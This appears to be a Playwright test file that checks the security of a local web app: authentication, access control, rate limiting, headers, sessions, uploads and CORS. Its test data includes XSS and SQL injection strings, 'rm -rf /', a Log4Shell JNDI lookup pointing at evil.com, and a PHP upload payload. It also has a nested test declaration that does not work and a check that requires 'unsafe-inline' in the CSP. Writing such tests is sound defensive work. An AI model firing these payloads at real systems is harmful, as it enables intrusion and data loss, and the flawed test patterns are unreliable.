/**
 * End-to-End Security Tests with Docker Containers
 * Testing the complete security framework in isolated Docker environment
 */

import { test, expect } from '@playwright/test';
import { chromium, Browser, Page } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';

test.describe('Docker Security Tests', () => {
  let browser: Browser;
  let page: Page;

  test.beforeAll(async () => {
    // Launch browser with security settings
    browser = await chromium.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu'
      ]
    });

    // Create new page with security context
    page = await browser.newPage();

    // Set security headers
    await page.setExtraHTTPHeaders({
      'User-Agent': 'Security-Test-Agent/1.0'
    });

    // Block unnecessary resources
    await page.route('**/*.{png,jpg,jpeg,svg,css,font}', route => route.abort());
  });

  test.afterAll(async () => {
    await browser.close();
  });

  test.describe('Authentication & Authorization', () => {
    test('should enforce JWT security with proper token validation', async () => {
      // Test JWT token validation
      const response = await page.request.post('http://localhost:3000/api/auth/login', {
        data: {
          email: 'test@example.com',
          password: 'TestPassword123!'
        }
      });

      expect(response.status()).toBe(200);
      const body = await response.json();

      // Validate JWT token structure
      expect(body.accessToken).toBeDefined();
      expect(body.accessToken.split('.')).toHaveLength(3);

      // Test token validation endpoint
      const validateResponse = await page.request.get('http://localhost:3000/api/auth/validate', {
        headers: {
          'Authorization': `Bearer ${body.accessToken}`
        }
      });

      expect(validateResponse.status()).toBe(200);
    });

    test('should prevent unauthorized access to protected routes', async () => {
      // Test access without token
      const response = await page.request.get('http://localhost:3000/api/protected');
      expect(response.status()).toBe(401);

      // Test access with invalid token
      const invalidResponse = await page.request.get('http://localhost:3000/api/protected', {
        headers: {
          'Authorization': 'Bearer invalid-token'
        }
      });
      expect(invalidResponse.status()).toBe(401);
    });

    test('should enforce RBAC permissions correctly', async () => {
      // Test role-based access control
      const loginResponse = await page.request.post('http://localhost:3000/api/auth/login', {
        data: {
          email: 'admin@example.com',
          password: 'AdminPassword123!'
        }
      });

      const { accessToken } = await loginResponse.json();

      // Test admin access
      const adminResponse = await page.request.get('http://localhost:3000/api/admin/users', {
        headers: {
          'Authorization': `Bearer ${accessToken}`
        }
      });
      expect(adminResponse.status()).toBe(200);

      // Test user access restriction
      const userLoginResponse = await page.request.post('http://localhost:3000/api/auth/login', {
        data: {
          email: 'user@example.com',
          password: 'UserPassword123!'
        }
      });

      const { accessToken: userToken } = await userLoginResponse.json();

      const userResponse = await page.request.get('http://localhost:3000/api/admin/users', {
        headers: {
          'Authorization': `Bearer ${userToken}`
        }
      });
      expect(userResponse.status()).toBe(403);
    });

    test('should validate input and prevent injection attacks', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        'SELECT * FROM users',
        'rm -rf /',
        '${jndi:ldap://evil.com/a}'
      ];

      maliciousInputs.forEach(input => {
        test(`should block malicious input: ${input}`, async () => {
          const response = await page.request.post('http://localhost:3000/api/test/input', {
            data: {
              maliciousField: input
            }
          });

          expect(response.status()).toBe(400);
          const body = await response.json();
          expect(body.error).toContain('validation');
        });
      });
    });
  });

  test.describe('Rate Limiting & DDoS Protection', () => {
    test('should enforce rate limiting on authentication endpoints', async () => {
      const requests = [];

      // Make multiple requests quickly
      for (let i = 0; i < 10; i++) {
        requests.push(
          page.request.post('http://localhost:3000/api/auth/login', {
            data: {
              email: 'test@example.com',
              password: 'wrongpassword'
            }
          })
        );
      }

      const responses = await Promise.all(requests);

      // Check if rate limiting kicks in
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should block suspicious IP addresses', async () => {
      // Test IP blocking functionality
      const suspiciousHeaders = {
        'X-Forwarded-For': '192.168.1.100',
        'User-Agent': 'sqlmap/1.6.12'
      };

      const response = await page.request.get('http://localhost:3000/api/health', {
        headers: suspiciousHeaders
      });

      expect([403, 429]).toContain(response.status());
    });
  });

  test.describe('Security Headers & CSP', () => {
    test('should enforce security headers', async () => {
      const response = await page.request.get('http://localhost:3000');
      const headers = response.headers();

      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['x-xss-protection']).toContain('mode=block');
      expect(headers['strict-transport-security']).toBeDefined();
      expect(headers['content-security-policy']).toBeDefined();
    });

    test('should enforce Content Security Policy', async () => {
      const response = await page.request.get('http://localhost:3000');
      const cspHeader = response.headers()['content-security-policy'];

      expect(cspHeader).toContain('default-src');
      expect(cspHeader).toContain('script-src');
      expect(cspHeader).toContain('style-src');
      expect(cspHeader).toContain('unsafe-inline');
    });

    test('should prevent clickjacking attacks', async () => {
      await page.goto('http://localhost:3000');

      // Try to embed in iframe
      const iframeResponse = await page.request.get('http://localhost:3000', {
        headers: {
          'X-Frame-Options': 'ALLOWALL'
        }
      });

      // Should still be blocked by server configuration
      expect(iframeResponse.headers()['x-frame-options']).toBe('DENY');
    });
  });

  test.describe('Session Management', () => {
    test('should properly manage user sessions', async () => {
      // Login and get session
      const loginResponse = await page.request.post('http://localhost:3000/api/auth/login', {
        data: {
          email: 'test@example.com',
          password: 'TestPassword123!'
        }
      });

      const { accessToken, refreshToken } = await loginResponse.json();

      // Use access token
      const protectedResponse = await page.request.get('http://localhost:3000/api/protected', {
        headers: {
          'Authorization': `Bearer ${accessToken}`
        }
      });
      expect(protectedResponse.status()).toBe(200);

      // Test refresh token functionality
      const refreshResponse = await page.request.post('http://localhost:3000/api/auth/refresh', {
        data: {
          refreshToken
        }
      });
      expect(refreshResponse.status()).toBe(200);

      // Test logout
      const logoutResponse = await page.request.post('http://localhost:3000/api/auth/logout', {
        headers: {
          'Authorization': `Bearer ${accessToken}`
        }
      });
      expect(logoutResponse.status()).toBe(200);

      // Verify token is blacklisted
      const blacklistedResponse = await page.request.get('http://localhost:3000/api/protected', {
        headers: {
          'Authorization': `Bearer ${accessToken}`
        }
      });
      expect(blacklistedResponse.status()).toBe(401);
    });

    test('should handle session timeouts correctly', async () => {
      // This test would need to mock time passage
      // For now, we'll test the session validation endpoint
      const response = await page.request.get('http://localhost:3000/api/auth/session/validate', {
        headers: {
          'Authorization': 'Bearer expired-token'
        }
      });

      expect(response.status()).toBe(401);
    });
  });

  test.describe('Data Validation & Sanitization', () => {
    test('should validate and sanitize user input', async () => {
      const testData = {
        email: 'test@example.com',
        name: '<script>alert("xss")</script>',
        bio: 'Normal bio text',
        age: 'not-a-number',
        website: 'javascript:alert("xss")'
      };

      const response = await page.request.post('http://localhost:3000/api/user/profile', {
        data: testData,
        headers: {
          'Authorization': 'Bearer valid-token'
        }
      });

      expect(response.status()).toBe(400);

      const body = await response.json();
      expect(body.validationErrors).toBeDefined();
      expect(body.validationErrors.length).toBeGreaterThan(0);
    });

    test('should prevent SQL injection attempts', async () => {
      const sqlInjectionAttempts = [
        "SELECT * FROM users",
        "1' OR '1'='1",
        "1; DROP TABLE users",
        "UNION SELECT username, password FROM users"
      ];

      for (const attempt of sqlInjectionAttempts) {
        const response = await page.request.post('http://localhost:3000/api/search', {
          data: {
            query: attempt
          }
        });

        expect([400, 403, 429]).toContain(response.status());
      }
    });
  });

  test.describe('File Upload Security', () => {
    test('should validate file uploads and prevent malicious files', async () => {
      // Test with various file types
      const testFiles = [
        { name: 'test.txt', content: 'Normal text file', type: 'text/plain' },
        { name: 'test.exe', content: 'malicious content', type: 'application/x-msdownload' },
        { name: 'test.php', content: '<?php echo "malicious"; ?>', type: 'application/x-php' }
      ];

      for (const file of testFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await page.request.post('http://localhost:3000/api/upload', {
          multipart: formData,
          headers: {
            'Authorization': 'Bearer valid-token'
          }
        });

        if (file.type.includes('php') || file.type.includes('exe')) {
          expect([400, 403]).toContain(response.status());
        } else {
          expect([200, 201]).toContain(response.status());
        }
      }
    });

    test('should enforce file size limits', async () => {
      // Create a large file
      const largeContent = 'x'.repeat(11 * 1024 * 1024); // 11MB
      const formData = new FormData();
      formData.append('file', new Blob([largeContent], { type: 'text/plain' }), 'large.txt');

      const response = await page.request.post('http://localhost:3000/api/upload', {
        multipart: formData,
        headers: {
          'Authorization': 'Bearer valid-token'
        }
      });

      expect(response.status()).toBe(413);
    });
  });

  test.describe('API Security', () => {
    test('should enforce API key validation for internal endpoints', async () => {
      const response = await page.request.get('http://localhost:3000/api/internal/metrics');
      expect(response.status()).toBe(401);

      const authorizedResponse = await page.request.get('http://localhost:3000/api/internal/metrics', {
        headers: {
          'X-API-Key': 'valid-api-key'
        }
      });
      expect(authorizedResponse.status()).toBe(200);
    });

    test('should validate CORS headers', async () => {
      const response = await page.request.get('http://localhost:3000/api/health', {
        headers: {
          'Origin': 'https://malicious.com'
        }
      });

      expect(response.status()).toBe(200);
      expect(response.headers()['access-control-allow-origin']).not.toBe('https://malicious.com');
    });
  });

  test.describe('Container Security', () => {
    test('should verify container hardening', async () => {
      // Check if container is running as non-root user
      const response = await page.request.get('http://localhost:3000/api/system/info');
      expect(response.status()).toBe(200);

      const body = await response.json();
      expect(body.user).not.toBe('root');
      expect(body.user).not.toBe(0);
    });

    test('should verify health check endpoints', async () => {
      const healthEndpoints = [
        '/health',
        '/api/health',
        '/api/system/health'
      ];

      for (const endpoint of healthEndpoints) {
        const response = await page.request.get(`http://localhost:3000${endpoint}`);
        expect(response.status()).toBe(200);

        const body = await response.json();
        expect(body.status).toBe('healthy');
      }
    });

    test('should verify metrics endpoint security', async () => {
      // Public access should be blocked
      const response = await page.request.get('http://localhost:3000/api/metrics');
      expect(response.status()).toBe(401);

      // Authenticated access should work
      const authorizedResponse = await page.request.get('http://localhost:3000/api/metrics', {
        headers: {
          'Authorization': 'Bearer valid-monitoring-token'
        }
      });
      expect(authorizedResponse.status()).toBe(200);
    });
  });
});